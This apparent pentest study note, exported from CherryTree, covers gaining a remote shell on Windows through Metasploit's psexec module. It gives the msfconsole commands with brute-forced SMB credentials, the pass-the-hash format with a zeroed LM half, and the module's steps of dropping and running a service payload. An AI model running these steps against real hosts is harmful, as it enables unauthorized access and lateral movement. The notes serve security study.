<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>psexec (metasploit)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>psexec (metasploit)</h1><br/><br />Once we have BruteForced Username and password of the SMB client we can exploit and have a shell on the machine<br /><br /><div class="codebox"><pre>msf&gt; use exploit<span style="color:#ff9d00;font-weight:700">/</span>windows<span style="color:#ff9d00;font-weight:700">/</span>smb<span style="color:#ff9d00;font-weight:700">/</span>psexec<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> RHOST 10.130.40.70<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> SMBPass [password]<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> SMBUser [user]<br />msf&gt; exploit</pre></div><br />   ◇ If we have LM:NTLM password we use will use <br />       <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">set</span> smbpass LM<span style="color:#ff9d00;font-weight:700">:</span>NTLM</pre></div><br />   ◇ If we have only NTLM, instead of the LM part we will need to insert 32 times 0<br />       <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">set</span> smbpass 00000000000000000000000000000000<span style="color:#ff9d00;font-weight:700">:</span>NTLM</pre></div><br />        <a href=""><img src="images/2102-1.png" alt="images/2102-1.png" /></a>     <a href=""><img src="images/2102-2.png" alt="images/2102-2.png" /></a><br />       <br /><br />Now we can go to retrieve more information:<br /><div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\[</span>user]<span style="color:#333333;font-weight:400">\D</span>esktop<br />C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers\</pre></div><br /><br /><br /><br /><br /><strong>Metasploit psexec comes from the original psexec of Windows</strong><br />‍PsExec is part of Microsoft’s Sysinternals suite, a set of tools to aid administrators in managing their systems. PsExec allows for remote command execution (and receipt of resulting output) over a named pipe with the Server Message Block (SMB) protocol, which runs on TCP port 445. The PsExec tool requires that the executable be present on the system performing the administration, but no additional software is necessary on target clients<br /><br /><br /><strong>Metasploit’s PSExec Module</strong><br />• Creates a randomly-named service executable with an embedded payload<br />• Connects to the hidden ADMIN$ share on the remote system via SMB<br />• Drops malicious service executable onto the share<br />• Utilizes the SCM to start a randomly-named service<br />• Service loads the malicious code into memory and executes it<br />• Metasploit payload handler receives payload and establishes session<br />• Module cleans up after itself, stopping the service and deleting the executable<br /><br /><br /><br /><br /><br />Bibliography:<br /><br /><a href="https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/">https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/</a><br /><a href="https://www.mindpointgroup.com/blog/lateral-movement-with-psexec">https://www.mindpointgroup.com/blog/lateral-movement-with-psexec</a><br /></div>
</body>
</html>
